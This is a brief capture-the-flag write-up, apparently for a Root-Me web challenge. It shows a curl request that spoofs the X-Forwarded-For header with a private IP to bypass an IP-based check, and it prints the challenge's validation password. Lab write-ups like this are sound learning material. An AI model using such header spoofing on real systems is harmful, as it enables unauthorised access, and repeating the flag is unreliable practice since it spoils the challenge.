Used BurpSuite to intercept the connection
Tried the X-Forwarded For
The HTTP X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.

curl 'http://challenge01.root-me.org/web-serveur/ch68/' --header 'X-Forwarded-For: 192.168.127.132'

Well done, the validation password is: <strong>Ip_$po0Fing
